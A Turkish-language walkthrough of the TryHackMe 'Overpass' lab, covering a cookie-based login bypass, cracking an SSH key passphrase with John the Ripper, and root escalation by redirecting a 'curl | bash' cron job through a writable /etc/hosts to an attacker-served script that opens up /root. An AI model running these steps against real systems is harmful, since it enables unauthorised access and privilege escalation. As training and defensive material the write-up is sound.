# 🔐 TryHackMe - Overpass CTF Writeup

![TryHackMe](https://img.shields.io/badge/TryHackMe-Overpass-red.svg?style=flat-square&logo=tryhackme)
![Difficulty](https://img.shields.io/badge/Difficulty-Easy-brightgreen.svg?style=flat-square)
![Category](https://img.shields.io/badge/Category-Auth_Bypass_%7C_SSH_Cracking_%7C_Cron_Hijacking-blue.svg?style=flat-square)

Bu doküman, TryHackMe platformundaki **Overpass** makinesinin dizin keşfi, çerez (cookie) manipülasyonu ile kimlik doğrulama atlatma (Broken Authentication), `ssh2john` ile RSA anahtar parolası kırma ve yazılabilir `/etc/hosts` üzerinden `cron` görevi ele geçirme (Privilege Escalation) adımlarını içermektedir.

**Platform:** TryHackMe  
**Oda:** Overpass ([tryhackme.com/room/overpass](https://tryhackme.com/room/overpass))  
**Zorluk:** Kolay (Easy)  
**Kategori:** Web / Broken Authentication / Cryptography / Cron & Hosts Hijacking  
**Hedef IP:** `10.112.168.20`

---

## 📑 İçindekiler

1. [Keşif & Port Taraması (Reconnaissance)](#1-keşif--port-taraması-reconnaissance)
2. [Web Keşfi & Gobuster ile Dizin Taraması](#2-web-keşfi--gobuster-ile-dizin-taraması)
3. [Cookie Manipülasyonu ile Kimlik Doğrulama Atlatma (Broken Authentication)](#3-cookie-manipülasyonu-ile-kimlik-doğrulama-atlatma-broken-authentication)
4. [RSA Anahtarı Parola Kırma (`ssh2john` & `john`)](#4-rsa-anahtarı-parola-kırma-ssh2john--john)
5. [SSH Erişimi & User Flag](#5-ssh-erişimi--user-flag)
6. [Yetki Yükseltme (Cron & `/etc/hosts` Hijacking) & Root Flag](#6-yetki-yükseltme-cron--etchosts-hijacking--root-flag)
7. [Özet Tablo & Çıkarımlar](#7-özet-tablo--çıkarımlar)
8. [Kaynaklar](#8-kaynaklar)

---

## 1. Keşif & Port Taraması (Reconnaissance)

Hedef makinedeki açık portları ve servis versiyonlarını belirlemek için `nmap` taraması çalıştırıldı:

```bash
nmap -sC -sV 10.112.168.20
```

**Açık Portlar:**
* `22/tcp` — **open** (SSH - OpenSSH)
* `80/tcp` — **open** (HTTP - Golang net/http Web Sunucusu)

---

## 2. Web Keşfi & Gobuster ile Dizin Taraması

Tarayıcı üzerinden hedef web uygulamasına gidildi:

```text
http://10.112.168.20
```

Ana sayfada "Overpass" adlı bir parola yöneticisi tanıtım sayfası yer almaktadır. Gizli dizinleri keşfetmek amacıyla `gobuster` ile dizin taraması (directory enumeration) gerçekleştirildi:

```bash
gobuster dir -u http://10.112.168.20 -w /usr/share/wordlists/dirb/common.txt
```

Tarama sonucunda `/admin` dizini keşfedildi ve tarayıcıdan bu sayfaya gidildi:

```text
http://10.112.168.20/admin
```

---

## 3. Cookie Manipülasyonu ile Kimlik Doğrulama Atlatma (Broken Authentication)

`/admin` sayfasında bir yönetici giriş formu bulunmaktadır. Sayfanın kaynak kodları ve yüklenen JavaScript dosyası (`login.js`) incelendiğinde kimlik doğrulama kontrolünün hatalı şekilde istemci tarafında (client-side) yapıldığı görüldü:

* Sunucudan `"Incorrect credentials"` yanıtı dönmediği sürece JavaScript kodu `SessionToken` adında bir çerez (cookie) oluşturup kullanıcıyı `/admin` sayfasına yönlendirmektedir.
* Sunucu tarafında ise `SessionToken` çerezinin içeriği doğrulanmamakta, yalnızca çerezin varlığı kontrol edilmektedir.

### Bypass Adımı:
Tarayıcı Geliştirici Araçları (**Developer Tools -> Storage / Application -> Cookies**) açılarak manuel bir çerez eklendi (veya Console üzerinden `Cookies.set("SessionToken", "admin")` çalıştırıldı):

* **Name:** `SessionToken`
* **Value:** `any_value` *(herhangi bir değer)*
* **Path:** `/`

Sayfa yenilendiğinde (`F5`) giriş ekranı başarıyla atlatıldı ve yönetici paneli açıldı. Panelde **`james`** kullanıcısına ait şifrelenmiş bir **SSH Private Key (`id_rsa`)** ele geçirildi.

---

## 4. RSA Anahtarı Parola Kırma (`ssh2john` & `john`)

Panelden kopyalanan özel anahtar (`RSA Private Key`) parola korumalı (passphrase encrypted) olduğu için önce yerel bir dosyaya kaydedildi ve izinleri ayarlandı:

```bash
nano id_rsa
chmod 700 id_rsa
```

Anahtarın parola özetini (hash) çıkarmak için `ssh2john` aracı kullanıldı:

```bash
ssh2john id_rsa > rsa.hash
```

Oluşturulan `rsa.hash` dosyası **John the Ripper** ve `rockyou.txt` ile kırıldı:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt rsa.hash
```

* **Bulunan Passphrase:** `james13`

---

## 5. SSH Erişimi & User Flag

Elde edilen `id_rsa` anahtarı ve `james13` parolası ile hedef sisteme SSH bağlantısı kuruldu:

```bash
ssh -i id_rsa james@10.112.168.20
# Enter passphrase for key 'id_rsa': james13
```

Ev dizinindeki dosyalar listelenerek ilk bayrak (`user.txt`) okundu:

```bash
ls -la
cat user.txt
```

---

## 6. Yetki Yükseltme (Cron & `/etc/hosts` Hijacking) & Root Flag

`root` yetkisine yükselmek için sistemde zamanlanmış görevler (`/etc/crontab`) kontrol edildi:

```bash
cat /etc/crontab
```

**Tespit Edilen Cron Görevi:**

```text
* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash
```

Sistem her dakika `root` kullanıcısı ile `overpass.thm` alan adından `/downloads/src/buildscript.sh` betiğini indirip doğrudan `bash` üzerinde çalıştırmaktadır.

### 6.1. `/etc/hosts` Dosyasının Manipülasyonu

`overpass.thm` alan adının nereye çözümlendiğini görmek ve dosya izinlerini incelemek için `/etc/hosts` kontrol edildi:

```bash
ls -la /etc/hosts
cat /etc/hosts
```

`/etc/hosts` dosyasının herkes tarafından **yazılabilir (world-writable)** olduğu görüldü! Dosya düzenlenerek `overpass.thm` karşısındaki `127.0.0.1` adresi kendi **AttackBox IP** adresimiz ile değiştirildi:

```bash
nano /etc/hosts
# <ATTACKBOX_IP>   overpass.thm
```

### 6.2. Zararlı `buildscript.sh` Oluşturma ve Sunma

Saldırgan makinesinde (AttackBox), cron görevinin istek atacağı dizin yapısı (`downloads/src/buildscript.sh`) birebir oluşturuldu ve içerisine `/root` dizini ile altındaki dosyaları okunabilir hale getirecek komutlar yazıldı:

```bash
mkdir -p downloads/src
cat << 'EOF' > downloads/src/buildscript.sh
#!/bin/bash
chmod 777 /root/
chmod 777 /root/*
EOF
```

Ardından `downloads` klasörünün bulunduğu üst dizinde 80 portundan bir Python HTTP sunucusu başlatıldı:

```bash
sudo python3 -m http.server 80
```

### 6.3. Betiğin Tetiklenmesi & Root Flag

Yaklaşık 1 dakika içinde hedef makinedeki cron görevi HTTP sunucumuza bağlanarak `buildscript.sh` dosyasını çekti ve `root` yetkisiyle çalıştırdı. İzinlerin değişmesiyle birlikte hedef makinedeki SSH oturumundan `/root/root.txt` okundu:

```bash
ls -la /root
cat /root/root.txt
```

---

## 7. Özet Tablo & Çıkarımlar

| Aşama | Bulgular / Kullanılan Yöntem | Sonuç |
| :--- | :--- | :--- |
| **Port Taraması** | `nmap -sC -sV 10.112.168.20` | `22/ssh`, `80/http` açık |
| **Dizin Keşfi** | `gobuster dir` | `/admin` yönetim sayfası bulundu |
| **Auth Bypass** | `SessionToken` çerezi oluşturma (Broken Auth) | `james` kullanıcısının `id_rsa` anahtarı alındı |
| **SSH Key Kırma** | `ssh2john id_rsa > rsa.hash` & `john` | Passphrase: `james13` |
| **User Flag** | `ssh -i id_rsa james@10.112.168.20` | `user.txt` ele geçirildi |
| **Privilege Escalation** | `/etc/hosts` yönlendirmesi + `cron` `curl \| bash` | `chmod 777 /root/*` ile `root.txt` okundu |

### Güvenlik Çıkarımları
1. **Sunucu Taraflı Oturum Doğrulaması:** Kimlik doğrulama ve oturum kontrolü asla yalnızca istemci taraflı JavaScript koduna bırakılmamalı; sunucu her istekte `SessionToken` değerinin kriptografik geçerliliğini doğrulamalıdır.
2. **Kritik Sistem Dosyası İzinleri:** `/etc/hosts` dosyası yalnızca `root` tarafından yazılabilir (`-rw-r--r--`) olmalıdır; aksi halde yerel DNS zehirlemesi (DNS spoofing) yapılabilir.
3. **`curl | bash` Tehlikesi:** Otomatik çalışan `root` cron görevlerinde ağ üzerinden doğrulamasız betik indirip doğrudan kabuğa (`| bash`) aktarmak uzaktan/yerelden kod çalıştırma zafiyetine yol açar.

---

## 8. Kaynaklar

- [TryHackMe — Overpass Odası](https://tryhackme.com/room/overpass)
- [OWASP — Broken Authentication](https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication)

